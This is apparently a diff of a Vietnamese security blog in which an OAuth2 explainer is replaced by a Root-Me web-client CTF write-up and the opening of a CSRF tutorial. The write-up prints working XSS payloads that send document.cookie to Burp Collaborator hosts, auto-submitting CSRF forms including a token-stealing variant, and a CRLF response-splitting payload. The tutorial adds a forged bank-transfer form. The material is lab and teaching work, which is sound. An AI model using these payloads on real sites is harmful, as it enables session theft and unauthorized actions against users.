-<p>Grant Type này còn thường được dùng cho mobile apps nhưng có đôi chút khác biệt trong quá trình xin ủy quyền. Nguyên nhân là do native apps hay Single-page apps  không thể lưu trữ hay đảm bảo được tính bí mật cho <strong>CLIENT SECRET</strong>  nên không thể sử dụng cái giá trị này để Authorization Server xác thực định danh ứng dụng. Và đó là lí do Flow sẽ bị thay đổi với cái tên là Authorization Code Flow với <strong>Proof Key for Code Exchange (PKCE)</strong>. Lúc này thay vì sử dụng CLIENT SECRET  nó sẽ sử dụng <strong>CODE VERIF</strong>IER và <strong>Challenge</strong>. Chi tiết hơn bạn có thể tham khảo <a href="https://auth0.com/docs/flows/concepts/auth-code-pkce" target="_blank" rel="noreferrer noopener">tại đây</a> .</p>
+<p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy password.</p>
 <!-- /wp:paragraph -->
 
 <!-- wp:heading -->
-<h2>Implicit Flow</h2>
+<h2>Javascript - Authentication 2</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>R<strong>esolution</strong></h3>
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p>Loại ủy quyền này thường được sử dụng cho các ứng dụng chạy trên trình duyệt (VD: Chrome Extension) và có thể ấp dụng cho các ứng dụng mà không sử dụng Client Secret nhưng người ta vẫn khuyến cáo bạn nên dùng <strong><strong>PKCE</strong></strong> hơn bởi Implicit không quá bảo mật .</p>
+<p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy file login.js . Nhưng ở đâu cần một chút kiến thức về js để lấy được user và password.</p>
 <!-- /wp:paragraph -->
 
-<!-- wp:paragraph -->
-<p>Khác với lại Authorization code , Authorization Server sẽ trả về Access Token luôn thay vì tiến hành trao đổi như Authorization code ,thứ 2 Implicit là  chỉ dùng để lấy access token và không hỗ trợ  Refresh Token.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:heading {"level":4} -->
-<h4>FLow</h4>
-<!-- /wp:heading -->
-
-<!-- wp:image -->
-<figure class="wp-block-image"><img src="https://curity.io/assets/images/resources/standards/oauth/flows/implicit-flow-01.svg" alt="Implicit Flow"/><figcaption><img src="https://curity.io/assets/images/resources/standards/oauth/flows/implicit-flow-01.svg" alt="Implicit Flow"></figcaption></figure>
+<!-- wp:image {"id":15,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-4.png" alt="" class="wp-image-15"/><figcaption>File login.js</figcaption></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
-<p>Đầu tiên  User sẽ chọn login</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Browser lúc này sẽ chuyển hướng người dùng đến Authorizarion Server (<strong>/authorize</strong>&nbsp;endpoint) </p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>/authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=https://client.example.com/callback </code></pre>
-<!-- /wp:code -->
-
-<!-- wp:paragraph -->
-<p>User tiến hành xác thực nếu chưa login và ủy quyền cho ứng dụng .</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Authorization Server chuyển hướng người dùng quay trở lại Browser cùng với Access Token.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>http:&#47;&#47;example.com/callback#access_token=2YotnFZFEjr1zCsicMWpAA&amp;state=xyz&amp;token_type=example&amp;expires_in=3600</code></pre>
-<!-- /wp:code -->
-
-<!-- wp:paragraph -->
-<p>Ok như vậy nếu như ứng dụng là 1 web-based app thì đến đây là có thể call API với Access Token để lấy dữ liệu từ Resource Owner. Còn đối với Mobile Application sẽ cần phải có các bước khác để trích xuất Access Token trong URI bằng script và gửi về cho nó. Nhưng một phần vì mình chưa có cơ hội được thực nghiệm nên mình sẽ không trình bày về nó , và dù tài liệu có nói nhưng rất khó mường tượng ra. Bạn có thể tham khảo ở <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc6749#section-4.2" target="_blank">đây</a>.</p>
+<p>Như ta có thể thấy TheLists="GOD:HIDDEN" =&gt; TheLists[i].split(":") =&gt; TheSplit[0] = "GOD" ; TheSplit[1]= "HIDDEN" =&gt; Username, Password.</p>
 <!-- /wp:paragraph -->
 
 <!-- wp:heading -->
-<h2>Resource owner credentials grant</h2>
+<h2>Javascript - Obfuscation 1</h2>
 <!-- /wp:heading -->
 
-<!-- wp:paragraph -->
-<p>Grant type này chỉ áp dụng cho  cho những ứng dụng có mức độ tin tưởng cao ( ví dụ như các ứng dụng của các dịch vụ đó phát hành hoặc các ứng dụng mặc định trên hệ thống )  . Bởi vì User sẽ phải cung cấp thông tin username và password trực tiếp cho Application sử dụng để lấy access_token.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:heading {"level":4} -->
-<h4>Flow</h4>
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
 <!-- /wp:heading -->
 
-<!-- wp:image -->
-<figure class="wp-block-image"><img src="https://cdn2.auth0.com/docs/media/articles/api-auth/password-grant.png" alt="Tài nguyên mật khẩu của chủ sở hữu"/></figure>
+<!-- wp:image {"id":19,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-5.png" alt="" class="wp-image-19"/><figcaption>Password bị mã hóa </figcaption></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
-<p>Đầu tiên User nhập thông tin đăng nhập (Username/Password) vào ứng dụng.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>grant_type=password&amp;username=johndoe&amp;password=A3ddj3w</code></pre>
-<!-- /wp:code -->
-
-<!-- wp:paragraph -->
-<p>Ứng dụng chuyển tiếp thông tin đăng nhập đến Authorization Server.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Authorization Server xác thực thông tin và trả về Access Token và Refresh Token.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Ứng dụng có thể sử dụng Access Token để gọi API .</p>
+<p>Nhìn qua ta thấy được password được mã hóa bằng URL encode. Sau khi decode ra ta có pass .</p>
 <!-- /wp:paragraph -->
 
 <!-- wp:heading -->
-<h2>Client Credentials Flow</h2>
+<h2>Javascript - Obfuscation 2</h2>
 <!-- /wp:heading -->
 
-<!-- wp:paragraph -->
-<p>Với các ứng dụng machine-to-machine (M2M), chẳng hạn như CLI, daemon hoặc dịch vụ chạy trên back-end của bạn, hệ thống sẽ xác thực và ủy quyền cho ứng dụng thay vì người dùng. Ứng dụng có thể yêu cầu lấy Access Token bằng bằng các thông tin của ứng dụng như CLIENT ID , CLIENT SECRET.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:heading {"level":4} -->
-<h4>Flow</h4>
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
 <!-- /wp:heading -->
 
-<!-- wp:image -->
-<figure class="wp-block-image"><img src="https://cdn2.auth0.com/docs/media/articles/flows/concepts/auth-sequence-client-credentials.png" alt="Trình tự xác thực luồng thông tin khách hàng"/></figure>
+<!-- wp:image {"id":21,"width":781,"height":100,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-7-1024x132.png" alt="" class="wp-image-21" width="781" height="100"/><figcaption>Password bị mã hóa</figcaption></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
-<p>Client  xác thực với Authorization Server bằng CLIENT ID và CLIENT SECRET .</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Authorization Server  xác thực và  phản hồi với Access Token.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Ứng dụng của bạn có thể sử dụng Access Token để gọi API cho chính nó.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Ok như vậy là mình trình bày khá tổng quát về các thứ của OAuth2, mình khuyến khích các bạn đọc thêm về nó chứ mình không thể nào viết chi tiết hơn được nữa mặc dù không khó hiểu nhưng nó quá dài. Mình sẽ để link bài viết ở cuối để các bạn tham khảo.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Qua bài viết này tôi đã giới thiệu với các bạn về OAuth2: khái niệm, các đối tượng tham gia, các luồng hoạt động , còn việc triển khai thì mình sẽ không trình bày các bạn nên tự tìm hiểu. Còn vấn đề về bảo mật và cách cách bypass thì mình sẽ trình bày vào bài viết sau. Cái gì cũng cần phải lắm chắc lý thuyết trước đã nhé.</p>
+<p>Ở challeng này password được mã hóa bằng URL encode  + Unescape  + Convert ascii =&gt; String =&gt; Password</p>
 <!-- /wp:paragraph -->
 
 <!-- wp:heading -->
-<h2>THAM KHẢO</h2>
+<h2>Javascript - Native code</h2>
 <!-- /wp:heading -->
 
-<!-- wp:list -->
-<ul><li><a href="https://auth0.com/docs/getting-started" target="_blank" rel="noopener">https://auth0.com/docs/getting-started</a></li><li><a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6749</a> ***</li><li><a href="https://alexbilbie.com/guide-to-oauth-2-grants/#which-oauth-20-grant-should-i-use" target="_blank" rel="noopener">https://alexbilbie.com/guide-to-oauth-2-grants/#which-oauth-20-grant-should-i-use</a></li><li><a href="https://curity.io/resources/develop/oauth/oauth-code-flow/" target="_blank" rel="noopener">https://curity.io/resources/develop/oauth/oauth-code-flow/</a></li></ul>
-<!-- /wp:list -->
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
 
+<!-- wp:image {"id":23,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-8-1024x278.png" alt="" class="wp-image-23"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Sử dụng console để decode và tìm ra password</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":25,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-9-1024x210.png" alt="" class="wp-image-25"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading -->
+<h2>Javascript - Obfuscation 3</h2>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>View page source ta thấy đoạn javascript, nhưng để tìm ra pass ta ko cần chú ý đến phần dechiffre() chỉ cần decode phần này:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Chuyển các giá trị hex sang string ta sẽ được chuỗi "55, 56, 54, 79, 115, 69, 114, 116, 107, 49, 50".</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Xong bỏ vô String.fromCharCode(), có thể dùng console là ta có kết quả.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>XSS - Stored 1</h2>
+<!-- /wp:heading -->
+
+<!-- wp:image {"id":27,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-10.png" alt="" class="wp-image-27"/><figcaption>Form chat vs admin</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Để tạo một xss stored bạn chỉ cần điền payload vào phần message và gửi cho admin rồi chờ đợi cho đến khi admin đọc tin nhắn có chứa mã độc.  </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote {"className":"is-style-large"} -->
+<blockquote class="wp-block-quote is-style-large"><p>&lt;script&gt;document.write("&lt;img src='<a rel="noreferrer noopener" target="_blank" href="https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/%22+document.cookie+?fbclid=IwAR2Qjw0GL4j5rKbqMfQmAINqFeQ31C4RLfvz1YFiOZsC2G5djg_7ukUkh34">https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/"+document.cookie+</a>"'&gt;");&lt;/script&gt;</p><cite>Payload  + Burp Collaborator client</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Khi admin đọc tin nhắn script sẽ được thực thi , cookie sẽ được gửi về:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":28,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-11.png" alt="" class="wp-image-28"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Cookie của Admin dùng để pass challenge này !</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>CSRF - 0 protection</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Sau khi tạo tài khoản và đăng nhập vào profile ta sẽ thấy các mục như contact, profile, private. Trong form profile ta có mục update và vs user bình thường sẽ không thực hiện được bởi chỉ có admin ms có quyền tich vào hộp check "status". Để bypass challenge này cần admin thực hiện update thông tin cho user bằng lỗ hổng csrf.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Sử dụng Burpsuite để bắt request submit Update và generate csrf poc hoặc  copy từ source rồi chỉnh sửa . Thêm vào đó thẻ input với type là "checkbox" , ô checkbox phải được check, mặc định values=”on”. Tạo function attack() sẽ thực  hiện submit update khi load lại trang.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Csrf poc:</p><cite>&lt;html&gt;<br>&lt;head&gt;<br> &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br>&lt;script&gt;<br>function attack() {document.getElementById("csrf").submit()}<br>&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body onload="attack()"&gt;<br>&lt;form id="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"&gt;<br>&lt;input type="text" name="username" value="user"&gt;<br>&lt;input type="checkbox" name="status" value="on" checked&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Bấy giờ post vào comment rồi submit cho admin, chờ  tầm 1 phút rồi vào mục "Private" để nhận pass.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>XSS - Reflected</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Ta truyền payload vào param "p" và dùng dấu " ' " dể đóng ngoặc bởi dấu phẩy kép bị mã hóa.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Xss thông qua url</p><cite>http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=%27alert(1)</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:image {"id":32,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-12.png" alt="" class="wp-image-32"/><figcaption>Thử nghiệm Xss thành công</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Sử dụng burp collaborator client</p><cite>http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=window.location=%27https://ylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net?%27.concat(document.cookie)%20id=%27</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Sau đó report cho Admin và chờ một chút sẽ nhận được flag</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>CSRF - token bypass</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Bài này tương tự cài CSRF 0 Protection nhưng khó hơn một chút bởi nó có sử dụng giá trị "forged-token" để ngăn chặn CSRF. Để có thể lừa admin submit như bài trước ta cần phải có token của admin nhưng điều này là không thể ta cần tìm một token  được sinh ra có thể dùng chung user thường vs admin. Trong mục "search" giá trị "forged-token" chúng ta có thể get và bỏ vào request gửi cho admin thực hiện lừa admin  submit một cách hợp lệ với giá trị "forged-token" đó.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>CSRF POC</p><cite>&lt;html&gt;<br> &lt;head&gt;<br>&lt;!-- CSRF PoC  --&gt;<br> &lt;/head&gt;<br> &lt;body onload="GetToken()"&gt;<br> <br> &lt;form id="form-payload" action="?action=profile" method="POST" enctype="multipart/form-data"&gt;<br>   &lt;input type="hidden" name="username" value="user"/&gt;<br>   &lt;input type="hidden" name="status" value="on"/&gt;<br>   &lt;input type="hidden" id="forged-token" name="token" value=""/&gt;<br>   &lt;input type="submit" value="go"/&gt;<br> &lt;/form&gt;<br> <br> &lt;script&gt;<br> var x = new XMLHttpRequest();<br> function GetToken() {<br>   x.open("GET","?action=profile",true);<br>   x.send(null); <br> }<br> x.onreadystatechange = function() {<br>   if (x.readyState == XMLHttpRequest.DONE) {<br>     var token = x.responseText.match(/name="token" value="(.+)"/)[1];<br>     document.getElementById("forged-token").value = token;<br>     document.getElementById("form-payload").submit();<br>   }<br> }<br> &lt;/script&gt;<br> &lt;/body&gt;<br> &lt;/html&gt;</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Submit cho admin và chờ một chút ta sẽ có kết quả.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>HTTP Response Splitting</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Để vượt qua challenge này ta cần một chút kiến thức về CRLF ( Carriage Return và Line Feed, CR và LF là các ký tự điều khiển, được mã hóa tương ứng 0x0D và 0x0A ). Hai kí tự này là một ký hiệu thể hiện sự kết thúc của response, và một response tiếp theo được bắt đầu, response ban đầu sẽ bị chia tách thành hai và nội dung của response thứ hai sẽ bị điều khiển bởi kẻ tấn công.Kẻ tấn công sau đó có thể tạo một request khác trong cùng một kết nối liên tục, và lừa người nhận (bao gồm cả các yếu tố trung gian) tin rằng response thứ hai này là để trả lời cho request thứ hai.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":36,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-13.png" alt="" class="wp-image-36"/><figcaption>Dấu hiệu CRLF</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Chú ý việc đâu tiền cần làm là thêm tiêu đề phản hồi HTTP giả mạo : Content-Length: 0. Điều này khiến trình duyệt web coi đây là phản hồi bị chấm dứt và bắt đầu phân tích một phản hồi mới sau đó là các header còn lại để tạo thành một request hợp lệ.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>CLRF POC</p><cite>%0D%0AContent-%20Length%3A%200 # ngắt response<br> %0D%0A # blank<br> %0D%0AHTTP%2F1.1%20200%20OK # Tạo response mới<br> %0D%0AContent-Type%3A%20text%2Fhtml <br> %0D%0AX-XSS-Protection%3A%200<br> %0D%0ALast-Modified%3A%20Thu%2C%2001%20Jan%202099%2012%3A00%3A00%20GMT%20<br> %0D%0AContent-Length%3A%20192<br> %0D%0A<br> %0D%0%0D%0A%3cscript%3edocument.write%28%3cimg%20src%3dhttps%3a%2f%2fylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net%3f%22.concat(document.cookie).concat(%22%20%2f%3e%22))%3c%2fscript%3e</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Submit và chờ kết quá trả về là session của admin.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>XSS STORED 2</h2>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Challenge nay cong viec giong voi challenge XSS Store 1 , Nhung diem chu y o day la viec payload khong duoc truyen vao bang input value ma truyen qua http header, va cu the o day la cookie.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Thu bat request gui message cho admin ve check:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":51,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-16.png" alt="" class="wp-image-51"/><figcaption>Bat request bang burp<br></figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ket qua tra ve la</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":52,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-17.png" alt="" class="wp-image-52"/><figcaption>Gia tri cua status duoc lay tu cookie</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Gia tri cua cookie "status= invite" da duoc dung de hien thi nguoi gui tin nhan.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Chen payload va doi admin doc tin nhan thoi!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Ket hop vs Burp collaborator client</p><cite>"&gt;document.write(%22&lt;img src=http://075lta73ds2oebant1t1ba7s9jf93y.burpcollaborator.net?%22.concat(document.cookie).concat(%22 /&gt;%22))<br></cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Script da duoc thuc thi</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":53,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-18-1024x171.png" alt="" class="wp-image-53"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Cookie nhan duoc dung de bypass challenge nay!!!! </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":58,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-19.png" alt="" class="wp-image-58"/></figure>
+<!-- /wp:image -->
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/06/14/oath/" data-id="ckbfu9q2j0000a6jm1bpufe7d" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/06/15/CTF%20/RootMe/WEB-CLIENT/" data-id="ckbgnw3850007jnjmejwd29ay" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/techology/" rel="tag">techology</a></li></ul>
+    </footer>
+  </div>
+  
+</article>
 
+
+  
+    <article id="post-WEB Pentesting/Web App/CROSS SIDE REQUEST FORGERY" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/15/WEB%20Pentesting/Web%20App/CROSS%20SIDE%20REQUEST%20FORGERY/" class="article-date">
+  <time datetime="2020-06-15T15:32:52.168Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/15/WEB%20Pentesting/Web%20App/CROSS%20SIDE%20REQUEST%20FORGERY/">WEB Pentesting/Web App/CROSS SIDE REQUEST FORGERY</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:heading {"level":4} -->
+<h4>CSRF là gì ?</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Cross site request forgery viết tắt là CSRF là một trong những lỗ hổng khá phổ biến của web application, lọt vào top 10 lỗ hổng của OWASP. Cũng được biết đến với các tên gọi&nbsp;<em>one-click attack, session riding, XSRF</em>,(còn mk thích gọi là client site request forgery :) ) , là một phương thức tấn công lừa trình duyệt người dùng thực hiện những request không mong muốn đến server trong khi họ vẫn trong phiên đăng nhập để attacker bypass xác thực.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"width":591,"height":444} -->
+<figure class="wp-block-image is-resized"><img src="https://manhnv.com/images/posts/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/Cross-Site-Request-Forgery.jpg?raw=true" alt="" width="591" height="444"/><figcaption>Cách tấn công CSRF</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Yếu tố dẫn đến lỗ hổng</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Chúng ta đều biết server sẽ lưu trữ cookie ở phía người dùng để phân biệt người dùng. Mỗi khi người dùng gửi một request tới một domain nào đó, cookie sẽ được tự động gửi kèm theo. Những web app chỉ sử dụng xác thực thông qua cookie , session cookie sẽ có nguy cơ bị tấn công CSRF. Tác động của nó đến người dùng có thể như thay đổi thông tin như usame, mail, password ... hay các hoạt động như là chuyển tiền , xóa tài khoản ... . Cùng xem ví dụ dưới đây :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://manhnv.com/images/posts/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/CSRF-copy.jpg?raw=true" alt="CSRF"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p> Một website có chức năng tiền và xác thực thông qua "Auth Cookie " của người dùng và tất nhiên giá trị attacker sẽ không thể biết hay đoán được này. Attacker sẽ tạo ra một GET request đến website vs URL có nội dung là chuyển tiền đến 1 tài khoản của hacker như sau :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p><a rel="noreferrer noopener" href="http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243" target="_blank">http://bank.com/app/transfer?amount=100000&amp;destinationAccount=7895457898054</a></p><cite>GET Request</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Hoặc nếu server chỉ nhận POST request thì attacker sẽ tạo ra một form trong file html như sau:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>&lt;html&gt;<br>&nbsp; &lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form action="<a rel="noreferrer noopener" href="http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243" target="_blank">http://bank.com/app/transfer</a>" method="POST"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="destinationAcount" value="<a rel="noreferrer noopener" href="http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243" target="_blank">7895457898054</a>" /&gt;                                                                      &lt;input type="hidedn" name="amount" value="<a rel="noreferrer noopener" href="http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243" target="_blank">100000</a>" /&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&nbsp;&nbsp;&nbsp; &lt;script&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.forms[0].submit();<br>&nbsp;&nbsp;&nbsp; &lt;/script&gt;<br>&nbsp; &lt;/body&gt;<br>&lt;/html&gt;</p><cite>POST request</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Khi trình duyệt của người dùng thực thi link hay file này sẽ đính kèm giá trị "Auth cookie" của website cấp cho người dùng đã được lưu để duy trì đăng nhập vào request lên server . Hiển nhiên phía server sẽ xác định đây là request do người dùng thực hiện và chuyển tiền tới tài khoản của attacker.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Cách thức tấn công </h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Đối với các request mà server chỉ nhận phương thức POST ,attacker sẽ tạo form trong file html và gửi cho nạn nhân . Request sẽ được thực thi khi nạn nhân mở file bằng trình duyệt như trong ví dụ trên.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Còn đối với request mà server dùng phương thức GET , attacker cũng có thể dùng form như phương thức POST nhưng thường cách dễ dàng hơn là gửi 1 URL có chứa các tham sỗ đã set sẵn. Hacker sẽ bỏ URL này vào 1 thẻ img, hoặc sử dụng các trang web phising để lừa người dùng thực thi.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p><a rel="noreferrer noopener" href="http://jav.bank/?from=Person1&amp;to=Person2&amp;amount=1000" target="_blank">http://jav.bank?from=Person1&amp;to=Person2&amp;amount=1000</a></p><cite>Vid dụ URL </cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Ngoài ra còn một số cách khai thác đặc biệt đối với các kiểu dữ liệu được gửi đi ví dụ với JSON data. Các bạn có thể tham khảo ở đây :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
